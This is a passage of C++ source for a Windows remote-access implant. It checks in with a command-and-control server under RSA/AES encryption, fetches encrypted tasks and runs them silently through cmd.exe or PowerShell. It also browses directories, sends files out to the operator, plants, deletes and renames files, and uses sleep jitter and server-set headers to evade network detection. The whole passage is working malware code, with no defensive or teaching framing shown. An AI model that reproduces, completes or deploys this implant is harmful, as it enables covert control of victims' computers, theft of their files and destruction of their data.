        string v = line.substr(colon + 1);
        size_t ks = k.find_first_not_of(" \t\r\n");
        if (ks == string::npos) continue;
        size_t ke = k.find_last_not_of(" \t\r\n");
        k = k.substr(ks, ke - ks + 1);
        size_t vs = v.find_first_not_of(" \t\r\n");
        if (vs == string::npos) v = "";
        else { size_t ve = v.find_last_not_of(" \t\r\n"); v = v.substr(vs, ve - vs + 1); }
        headers[k] = v;
    }
    return headers;
}

void apply_jitter() {
    if (start_jitter > end_jitter) swap(start_jitter, end_jitter);
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(start_jitter, end_jitter);
    int jitter_amount = dis(gen);
    double final_sleep = sleep_time + jitter_amount;
    final_sleep = max(10.0, min(900.0, final_sleep));
    this_thread::sleep_for(chrono::milliseconds((int)(final_sleep * 1000)));
}


bool checkin() {
    try {
        vector<unsigned char> aes_key(32);
        HCRYPTPROV hProv = 0;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            CryptGenRandom(hProv, 32, aes_key.data());
            CryptReleaseContext(hProv, 0);
        } else {
            for (int i = 0; i < 32; ++i) aes_key[i] = (unsigned char)(rand() % 256);
        }

        vector<uint8_t> auth_id_bytes(AUTH_ID.begin(), AUTH_ID.end());
        vector<uint8_t> enc_token_bytes = rsa->encrypt(auth_id_bytes);
        vector<uint8_t> enc_aes_bytes = rsa->encrypt(aes_key);
        if (enc_token_bytes.empty() || enc_aes_bytes.empty()) return false;

        string token_b64 = base64_encode(string((char*)enc_token_bytes.data(), enc_token_bytes.size()));
        string aes_key_b64 = base64_encode(string((char*)enc_aes_bytes.data(), enc_aes_bytes.size()));

        string payload = "{\"action\":\"checkin\",\"token\":\"" + json_escape(token_b64) +
                         "\",\"aes_key\":\"" + json_escape(aes_key_b64) + "\"}";

        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) return false;
        if (response.find("\"sid\"") == string::npos) return false;

        string sid_str = get_json_value(response, "sid");
        if (sid_str.empty()) return false;

        session_id = sid_str;

        string ua = get_json_value(response, "ua");
        if (!ua.empty()) current_user_agent = ua;

        string sj = get_json_value(response, "sj");
        if (!sj.empty()) { try { start_jitter = stoi(sj); } catch(...){} }

        string ej = get_json_value(response, "ej");
        if (!ej.empty()) { try { end_jitter = stoi(ej); } catch(...){} }

        string sl = get_json_value(response, "sl");
        if (!sl.empty()) { try { sleep_time = stod(sl); } catch(...){} }

        vector<string> uris_new = get_json_array(response, "ur");
        if (!uris_new.empty()) uris = uris_new;

        string pre = get_json_value(response, "pre");
        if (!pre.empty()) prepend_output = json_unescape(pre);

        string app = get_json_value(response, "app");
        if (!app.empty()) append_output = json_unescape(app);

        string gh = get_json_value(response, "gh");
        get_client_headers.clear();
        if (!gh.empty()) get_client_headers = parse_headers(json_unescape(gh));

        string ph = get_json_value(response, "ph");
        post_client_headers.clear();
        if (!ph.empty()) post_client_headers = parse_headers(json_unescape(ph));

        aes = new AESCipher(aes_key);
        return true;
    } catch (...) { return false; }
}

string get_tasks() {
    if (session_id.empty() || !aes) return "";
    try {
        string payload = "{\"action\":\"get_tasks\",\"sid\":\"" + json_escape(session_id) + "\"}";
        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) return "";
        string cmd_enc = get_json_value(response, "command");
        if (cmd_enc.empty()) return "";
        string cmd = aes->decrypt(cmd_enc);
        size_t s = cmd.find_first_not_of(" \t\r\n");
        if (s == string::npos) return "";
        size_t e = cmd.find_last_not_of(" \t\r\n");
        return cmd.substr(s, e - s + 1);
    } catch (...) { return ""; }
}

void submit_output(const string& output) {
    if (session_id.empty() || !aes) return;
    try {
        string encrypted = aes->encrypt(output);
        string final_output = prepend_output + encrypted + append_output;
        string payload = "{\"action\":\"submit\",\"sid\":\"" + json_escape(session_id) +
                         "\",\"out\":\"" + json_escape(final_output) + "\"}";
        http_request(get_url(), "POST", payload, get_request_headers(true));
    } catch (...) {}
}


string run_cmd_command(const string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "cmd.exe /c " + cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

string run_powershell_command(const string& ps_cmd) {
    string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

Json browse_directory(const string& path) {
    Json result = Json::object();
    try {
        string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) actual_path = string(home) + actual_path.substr(1);
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = nullptr;
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() +
                        std::chrono::system_clock::now()));
                stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                items.push_back(item);
            } catch (...) { continue; }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = nullptr;
        } else if (parent.empty()) {
            result["parent_path"] = nullptr;
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = nullptr;
        result["items"] = Json::array();
    }
    return result;
}

string download_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: File not found: " + filepath;
        if (std::filesystem::is_directory(filepath)) return "ERROR: Cannot download directory: " + filepath;

        ifstream file(filepath, ios::binary);
        if (!file) return "ERROR: Cannot open file: " + filepath;

        vector<unsigned char> file_data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
        file.close();

        string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        string encoded = base64_encode(string((char*)file_data.data(), file_data.size()));

        return "file-data:" + filename + "|" + to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string upload_file(const string& filepath, const string& filedata_b64) {
    try {
        string decoded_data = base64_decode(filedata_b64);
        vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        ofstream file(filepath, ios::binary);
        if (!file) return "ERROR: Cannot write file: " + filepath;
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string delete_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: Path does not exist: " + filepath;
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string rename_file(const string& old_path, const string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) return "ERROR: Source path does not exist: " + old_path;
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string execute_command(const string& cmd) {
    string trimmed = cmd;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return "[no command]";

    if (trimmed == "ping") return "pong";

    if (trimmed.find("browse:") == 0) {
        string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) browse_path = std::filesystem::current_path().string();
        Json dir_data = browse_directory(browse_path);
        string base64_data = base64_encode(dir_data.dump());
        return "browse-data-" + base64_data;
    }
    if (trimmed.find("download-file:") == 0) {
        string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return download_file(filepath);
    }
    if (trimmed.find("upload-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string filepath = rest.substr(0, sep_pos);
            string filedata_b64 = rest.substr(sep_pos + 1);
            return upload_file(filepath, filedata_b64);
        }
        return "ERROR: Invalid upload format";
    }
    if (trimmed.find("delete-file:") == 0) {
        string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return delete_file(filepath);
    }
    if (trimmed.find("rename-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string old_path = rest.substr(0, sep_pos);
            string new_path = rest.substr(sep_pos + 1);
            return rename_file(old_path, new_path);
        }
        return "ERROR: Invalid rename format";
    }

    string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);
    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        return run_powershell_command(trimmed.substr(3));
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        return run_powershell_command(trimmed.substr(2));
    }
    return run_cmd_command(trimmed);
}

void main_loop() {
    rsa = new RSACipher();
    if (!rsa->is_valid()) return;

    while (session_id.empty()) {
        if (checkin()) break;
        int wait_time = rand() % 40000 + 20000;
        this_thread::sleep_for(chrono::milliseconds(wait_time));
    }

    int iteration = 0;
    while (true) {
        try {
            iteration++;
            string cmd = get_tasks();
            if (!cmd.empty()) {
                string result = execute_command(cmd);
                submit_output(result);
            }

            if (iteration <= 5) {
                this_thread::sleep_for(chrono::milliseconds(300));
            } else {
                apply_jitter();
            }
        } catch (...) {
            int wait_time = rand() % 90000 + 30000;
            this_thread::sleep_for(chrono::milliseconds(wait_time));
        }
    }
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));

    HINTERNET hInternet = InternetOpenA(DEFAULT_USER_AGENT.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;
    InternetCloseHandle(hInternet);

    main_loop();
    return 0;
}
